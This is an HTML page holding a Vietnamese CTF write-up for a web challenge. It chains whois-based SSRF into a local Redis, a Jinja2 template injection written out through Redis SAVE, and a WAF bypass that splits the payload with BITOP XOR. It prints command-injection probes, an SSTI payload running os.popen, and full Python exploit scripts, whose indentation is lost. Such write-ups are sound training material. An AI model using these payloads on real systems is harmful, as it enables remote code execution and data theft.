@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>WHO IS WHOIS - CTF Writeup</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="stylesheet" href="/assets/css/premium.css">
+</head>
+<body>
+  <header class="topbar">
+    <div class="wrap topbar-inner">
+      <a class="brand" href="/">ThaiNgoc :~$</a>
+      <nav class="nav">
+        <a href="/">Home</a>
+        <a class="active" href="/writeups/">Writeups</a>
+        <a href="/projects/">Projects</a>
+        <a href="/achievements/">Achievements</a>
+        <a href="/contact/">Contact</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="page">
+    <div class="wrap writeup-article">
+      <section class="hero">
+        <div class="hero-copy glass">
+          <div class="eyebrow">CTF Writeup • Web Exploitation</div>
+          <h1>WHO IS WHOIS</h1>
+          <p class="lead">
+            Flag: NHNC{wH0is_t0_R3d1s_s5Rf_Tq9x_Z7mP_a0bdff8f40744e2e8c2104a7ab74ffe6}
+          </p>
+          <div class="meta-row">
+            <span class="pill">Category: Web</span>
+            <span class="pill">Technique: SSRF to SSTI via Redis</span>
+          </div>
+        </div>
+      </section>
+
+      <section class="card glass">
+<p>Flag: NHNC{wH0is_t0_R3d1s_s5Rf_Tq9x_Z7mP_a0bdff8f40744e2e8c2104a7ab74ffe6}</p>
+<p>Mình nhập thử google.com.Web in ra thông tin đăng ký tên miền của Google.Backend chắc chắn đang gọi lệnh hệ thống whois. Thử ngay Command Injection</p>
+
+<div class="text-center"><img src="/assets/media/writeups/ctf/whois/image1.png" alt="Screenshot" style="max-width:100%; border-radius:8px; margin: 20px 0;"></div>
+<p>Vì ứng dụng rõ ràng đang gọi công cụ "whois" của hệ điều hành dưới nền (vd: os.system("whois " + input)), ý tưởng kinh điển nhất là Command Injection. Tôi thử nối thêm lệnh bằng dấu chấm phẩy: google.com; id và google.com \`whoami\`</p>
+
+<div class="text-center"><img src="/assets/media/writeups/ctf/whois/image2.png" alt="Screenshot" style="max-width:100%; border-radius:8px; margin: 20px 0;"></div>
+
+<div class="text-center"><img src="/assets/media/writeups/ctf/whois/image3.png" alt="Screenshot" style="max-width:100%; border-radius:8px; margin: 20px 0;"></div>
+<p>Vậy là có WAF chặn hết các kí tự nhạy cảm, vậy là hướng này có lẽ không khai thác được nên tôi tìm con đường khác</p>
+<p>Khi bị chặn bởi WAF, tôi không đâm đầu vào nó nữa, tôi đi tìm đường khác.Tôi mở Terminal gõ man whois để đọc tài liệu gốc.</p>
+
+<div class="text-center"><img src="/assets/media/writeups/ctf/whois/image4.png" alt="Screenshot" style="max-width:100%; border-radius:8px; margin: 20px 0;"></div>
+<p>Bản chất lệnh whois không phải là một công cụ phân tích cục bộ. Khi tôi gõ whois google.com, công cụ này sẽ mở một kết nối TCP đến một máy chủ Whois quốc tế.Tôi sẽ lợi dụng -h và -p để chuyển hướng kết nối tcp đó.Nên tôi nghĩ đến sẽ khai thác theo hướng SSRF</p>
+
+<div class="text-center"><img src="/assets/media/writeups/ctf/whois/image5.png" alt="Screenshot" style="max-width:100%; border-radius:8px; margin: 20px 0;"></div>
+<p>Máy chủ này chắc chắn đang chạy một database tên là Redis ở dưới nền để làm bộ đệm.Tôi sẽ thử theo hướng cho máy chủ Web tự kết nối vào chính nó 127.0.0.1 ở cổng 6379. Cổng 6379 là cổng mặc định của Redis.Vì máy chủ web tin tưởng chính nó nên Redis sẽ không đòi hỏi mật khẩu.Nếu như test thành công thì tôi sẽ lợi dụng nó</p>
+
+<div class="text-center"><img src="/assets/media/writeups/ctf/whois/image6.png" alt="Screenshot" style="max-width:100%; border-radius:8px; margin: 20px 0;"></div>
+<p>SSRF đang hoạt động.</p>
+<p>Soi mã nguồn HTML và phát hiện form được gửi qua phương thức POST tới endpoint /api/whois.</p>
+
+<div class="text-center"><img src="/assets/media/writeups/ctf/whois/image7.png" alt="Screenshot" style="max-width:100%; border-radius:8px; margin: 20px 0;"></div>
+<p>Tôi có thể điều khiển Redis, nhưng cần tìm cách đọc file từ Redis.</p>
+
+<div class="text-center"><img src="/assets/media/writeups/ctf/whois/image8.png" alt="Screenshot" style="max-width:100%; border-radius:8px; margin: 20px 0;"></div>
+<p>Web đang dùng Template Engine (Jinja2) để đọc các file .tpl và render ra HTML.</p>
+<p>Nếu mình đổi style thành ../db/dump (này tên file backup mặc định của Redis), web có thể đọc chính cái database Redis lên và render, tên file mặc định thường là dump.rdb</p>
+<p>Tôi sẽ lợi dụng SSRF để gửi mã độc SSTI vào Redis, sau đó ra lệnh cho Redis lưu file đó thành dump.tpl và đặt vào thư mục web, thì khi ta truy cập /render?tpl=../db/dump, mã độc sẽ được kích hoạt</p>
+<p>Sau đó tôi đọc tài liệu trên github PayloadsAllTheThings</p>
+<p>Mục tiêu của tôi bây giờ là:Nhét mã độc Jinja2 vào Redis, ép Redis ghi ra file dump.tpl Gọi /render?tpl=../db/dump để thực thi mã độc</p>
+<p>Mã độc SSTI để đọc flag: {{ config.__class__.__init__.__globals__['os'].popen('/flag').read() }}</p>
+<p>Test thử</p>
+
+<div class="text-center"><img src="/assets/media/writeups/ctf/whois/image9.png" alt="Screenshot" style="max-width:100%; border-radius:8px; margin: 20px 0;"></div>
+<p>WAF cấm tất cả các kí tự quan trọng để mình sử dụng lỗi SSTI</p>
+<p>Lúc này tôi nhớ đến một khái niệm gọi là Smuggling,kiểu như mình muốn mang chất nổ qua cổng an ninh nhưng máy quét sẽ quét được và cấm nó.Nhưng nếu mình tách nó ra thành các chất vô hại như muối,nước,.. rồi khi đi qua cổng mình mới chế tạo thuốc nổ thì mình sẽ vượt qua được cổng an ninh.</p>
+<p>Sau khi tìm kiếm Redis thì mình thấy có lệnh BITOP XOR.Nó sẽ lấy a xor với b và sinh ra c.Nhưng payload của tôi khá dài nên tôi phải viết script python để nó tự xor cái payload đó thành a với b.</p>
+
+<pre><code>target = "{{config|attr(request.args.c)|attr(request.args.i)|attr(request.args.g)|attr(request.args.ge)(request.args.os)|attr(request.args.po)(request.args.cmd)|attr(request.args.r)()}}"
+forbidden = set('/\\;\n|&`$!?*()"\'_ []<>{}#%=')
+allowed = set(chr(i) for i in range(32,127)) - forbidden
+s1, s2 = "", ""
+for c in target:
+for a in allowed:
+for b in allowed:
+if ord(a)^ord(b)==ord(c):
+s1+=a; s2+=b; break
+else: continue
+break
+print("S1="+s1)
+print("S2="+s2)
+</code></pre>
+
+<div class="text-center"><img src="/assets/media/writeups/ctf/whois/image10.png" alt="Screenshot" style="max-width:100%; border-radius:8px; margin: 20px 0;"></div>
+<p>Giờ ta đã có a với b, xong rồi bây giờ bắt đầu lấy flag.Tôi sẽ gửi lệnh FLUSHDB để xóa sạch rác trong RAM Redis.Gửi S1 và S2 qua bộ lọc WAF vào Redis bằng lệnh SET k1 và SET k2. Vì S1 và S2 không chứa ký tự cấm, WAF sẽ không nhận ra.Sau đó tôi gọi lệnh BITOP XOR pwn k1 k2.Lúc này nó sẽ ghép lại thành payload.Sau đó tôi dùng lệnh SAVE để nén toàn bộ RAM thành file dump.tpl trên ổ cứng.Rồi tôi truy cập url /render?tpl=../db/dump sau đó Jinja2 sẽ đọc dump.tpl sau đó nó sẽ quét thấy lệnh os.popen('/flag') rồi sẽ in ra flag</p>
+
+<pre><code>import urllib.request, urllib.parse, time
+BASE = "http://7a927d5f73904ed1a421a84ef918aa690.chal2.teagod.tech:8003"
+s1 = "444944S444444e4444444e4444e4S44444e4444444e4444eSS44444e4444444e4444e4S44444e4444444e4444e44Se4444444e4444e94S44444e4444444e4444e49Se4444444e4444e444S44444e4444444e4444e4SeS44"
+s2 = "OOWVZR:SHU@@FMFQEAQG@KUFSGKWzHU@@FMFQEAQG@KUFSGK:zHU@@FMFQEAQG@KUFSGKSzHU@@FMFQEAQG@KUFSGKSQzMFQEAQG@KUFSGKVGzHU@@FMFQEAQG@KUFSGKDVzMFQEAQG@KUFSGKWYPzHU@@FMFQEAQG@KUFSGKFzMzII"
+def send(cmd):
+data = urllib.parse.urlencode({'domain': f"{cmd} -h 127.0.0.1 -p 6379"}).encode()
+urllib.request.urlopen(urllib.request.Request(f"{BASE}/api/whois", data=data))
+send("FLUSHDB")
+send("CONFIG SET dbfilename dump.tpl")
+send(f"SET k1 {s1}")
+send(f"SET k2 {s2}")
+send("BITOP XOR pwn k1 k2")
+send("SAVE")
+time.sleep(1)
+params = urllib.parse.urlencode({
+'tpl': '../db/dump', 'c': '__class__', 'i': '__init__', 'g': '__globals__',
+'ge': 'get', 'os': 'os', 'po': 'popen', 'cmd': '/flag', 'r': 'read'
+})
+req = urllib.request.Request(f"{BASE}/render?{params}")
+print(urllib.request.urlopen(req).read().decode(errors='replace'))
+</code></pre>
+
+<div class="text-center"><img src="/assets/media/writeups/ctf/whois/image11.png" alt="Screenshot" style="max-width:100%; border-radius:8px; margin: 20px 0;"></div>
+
+      </section>
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="wrap text-center">
+      <p class="small text-muted">© 2026 Nguyen Thai Ngoc. Built for Security & Forensics Portfolios.</p>
+    </div>
+  </footer>
+
+  <script src="/assets/js/main.js"></script>
+  <script src="/assets/js/premium.js"></script>
+</body>
+</html>
